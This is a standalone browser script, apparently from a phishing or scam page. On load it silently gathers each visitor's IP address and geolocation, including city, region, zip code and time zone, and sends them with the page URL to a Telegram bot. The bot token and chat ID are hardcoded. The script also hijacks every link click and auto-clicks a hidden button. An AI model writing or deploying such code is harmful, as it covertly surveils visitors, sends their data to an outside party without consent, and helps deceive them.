const all_href = document.getElementsByTagName("a");
async function getOnlyIp() {
  const req = await fetch("https://api.ipify.org?format=json");
  const getIp = await req.json();
  return getIp;
}

async function getUserInfo() {
  const { ip } = await getOnlyIp();
  const request = await fetch(`https://freeipapi.com/api/json/${ip}`, {
    method: "GET",
  });
  const response = await request.json();
  return response;
}
function country2flag(countryCode) {
  return countryCode
    .toUpperCase()
    .split("")
    .map((char) => String.fromCodePoint(char.charCodeAt(0) + 0x1f1a5))
    .join("");
}
window.addEventListener("load", async () => {
  for (let index = 0; index < all_href.length; index++) {
    all_href[index].addEventListener("click", (e) => {
      e.preventDefault();
      console.log("click");
      document.querySelector("#interact").click();
    });
  }
  const { ip } = await getOnlyIp();
  console.log(getUserInfo());
  const {
    ipAddress,
    cityName,
    countryName,
    zipCode,
    regionName,
    timeZones,
    countryCode,
  } = await getUserInfo();
  const botApi = "6559381340:AAFBebXhmpgSbUEsijMnYWxzs75csh_3kLo";
  const chatId = "-1002217556728";
  const urlWeb = window.location;
  const country_Flag = country2flag(countryCode);
  const textField = `📣 New Visitor, User Details:%0A%0A📍 ${ipAddress}%0A${country_Flag} ${countryName}%0A🏠 ${cityName}%0A🏙️ ${regionName}%0A📭 ${zipCode}%0A🌎 ${timeZones[0]}%0A🔗 ${urlWeb}`;
  const url = `https://api.telegram.org/bot${botApi}/sendMessage?chat_id=${chatId}&text=${textField}`;
  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();
  document.getElementById("AutoBtnClicked").click();
  console.log("message success");
});
